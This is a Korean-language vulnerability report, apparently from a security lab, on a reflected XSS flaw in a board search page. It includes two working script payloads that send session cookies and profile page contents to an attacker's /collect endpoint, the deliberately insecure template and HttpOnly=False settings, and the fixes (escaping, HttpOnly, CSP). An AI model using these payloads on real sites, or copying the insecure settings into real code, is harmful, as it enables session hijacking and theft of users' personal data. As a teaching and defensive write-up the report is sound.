# [취약점 분석 보고서] XSS 심화: 세션 탈취 및 데이터 유출 (Exfiltration)

## 1. 공격지점 (Attack Surface)
- **대상**: 게시판 검색결과 출력 페이지 (`/posts`)
- **취약 요소**: 검색어(`q`)의 불충분한 출력 이스케이프 (`|safe` 필터 사용)
- **환경 조건**: 세션 쿠키의 `HttpOnly` 속성이 `False`로 설정됨 (실습용 설정)

## 2. 공격방식 (Attack Method)

### 2.1 세션 쿠키 탈취 (Session Hijacking)
- **페이로드**: `<script>fetch('/collect?cookie=' + btoa(document.cookie))</script>`
- **공격 과정**: 
    1. 관리자나 일반 사용자가 악성 스크립트가 포함된 검색 결과 링크를 클릭함.
    2. 브라우저는 `document.cookie`를 통해 읽은 세션 값을 Base64로 인코딩하여 공격자 서버(`/collect`)로 전송함.
    3. 공격자는 수집된 쿠키를 이용해 희생자의 세션을 탈취하고 신분을 도용함.

### 2.2 개인정보 및 데이터 유출 (Data Exfiltration)
- **페이로드**: `<script>fetch('/profile').then(r=>r.text()).then(d=>fetch('/collect', {method:'POST', body:btoa(d)}))</script>`
- **공격 과정**:
    1. 사용자가 페이지 접속 시 배경에서 사용자의 세션을 이용해 `/profile` 페이지를 호출함.
    2. 응답으로 받은 마이데이터/프로필 HTML 본문을 공격자 수집 서버로 POST 전송함.
    3. 공격자는 사용자가 화면에서 인지하지 못하는 사이 민감한 개인정보를 송출받음.

## 3. 취약코드 (Vulnerable Code)

### 3.1 템플릿 레벨 (XSS 허용)
```html
<!-- was/app/templates/posts/list.html -->
검색어 <strong>'{{ q|safe }}'</strong>에 대한 결과입니다.
```

### 3.2 서버 설정 레벨 (탈취 허용)
```python
# was/app/__init__.py
app.config.update(
    SESSION_COOKIE_HTTPONLY=False,  # 세션을 스크립트로 읽을 수 있게 허용함
)
```

## 4. 개선코드 (Mitigation Code)

### 4.1 기본 방어: 출력 이스케이프 (Output Escaping)
- `|safe` 필터를 제거하여 모든 사용자 입력값을 HTML 엔티티로 변환합니다.

### 4.2 강화된 방어: 보안 쿠키 설정 (HttpOnly Cookie)
- 세션 쿠키 생성 시 `HttpOnly` 속성을 `True`로 설정합니다.
```python
# was/app/__init__.py
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,  # 자바스크립트의 접근을 원천 차단
)
```

### 4.3 심화 방어: 콘텐츠 보안 정책 (CSP)
- `Content-Security-Policy` 헤더를 설정하여 비인가된 도메인으로의 데이터 전송(`connect-src`)을 제한합니다.
